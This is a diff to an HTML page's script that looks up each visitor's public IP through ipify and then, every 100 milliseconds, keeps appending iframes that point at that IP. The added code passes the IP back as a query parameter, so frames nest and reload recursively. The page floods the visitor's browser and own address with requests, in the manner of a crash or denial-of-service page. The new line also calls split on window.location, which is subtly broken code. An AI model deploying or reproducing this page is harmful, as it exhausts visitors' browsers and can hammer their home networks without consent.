@@ -3,6 +3,17 @@
 </head>
 <body>
 <script>
+  let s = window.location.split("?")[1].split("=")
+  
+  if(s[0]=="ip") {
+setInterval(()=>{
+let i = document.createElement("iframe")
+i.src=window.location.protocol+"//"+s[1]
+document.body.appendChild(i)
+},100)    
+    
+  } else {
+    
 fetch("https://api.ipify.org/?format=jsonp&callback=")
 .then(r=>r.text())
 .then(t=>{
@@ -11,11 +22,12 @@ fetch("https://api.ipify.org/?format=jsonp&callback=")
   console.log(j)
 setInterval(()=>{
 let i = document.createElement("iframe")
-i.src="https://"+j.ip
+i.src=window.location.protocol+"//"+j.ip+"?ip="+j.ip
 document.body.appendChild(i)
 },100)
 })
-
+    
+  }
 
 </script>
 </body>
